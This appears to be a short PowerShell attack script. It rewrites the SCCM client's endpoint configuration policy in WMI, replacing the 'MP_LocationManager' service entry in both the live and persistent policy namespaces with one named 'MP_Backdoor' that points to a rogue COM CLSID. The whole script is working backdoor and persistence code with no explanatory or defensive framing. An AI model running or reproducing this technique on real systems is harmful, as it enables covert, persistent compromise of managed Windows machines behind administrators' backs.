$namespace_persist = "root\ccm\Policy\DefaultMachine\RequestedConfig" 
$namespace_live = "root\ccm\Policy\Machine\ActualConfig" 
$className = "CCM_Service_EndpointConfiguration"

$rogue_servicename = "MP_Backdoor"
$rogue_clsid = "{12345678-9012-3456-7890-123456789abc}"

$obj_persist = Get-WmiObject -Class $className -Namespace $namespace_persist -Filter "Name = 'MP_LocationManager'"
$obj_live = Get-WmiObject -Class $className -Namespace $namespace_live -Filter "Name = 'MP_LocationManager'"

$obj_live.Name = $rogue_servicename
$obj_live.CoClass = $rogue_clsid

$obj_live | Set-WmiInstance


$obj_persist.Name = $rogue_servicename
$obj_persist.CoClass = $rogue_clsid
$obj_persist.PolicyInstanceID = "{$((New-Guid).ToString().ToUpper())}"

$obj_persist


$obj_persist | Set-WmiInstance

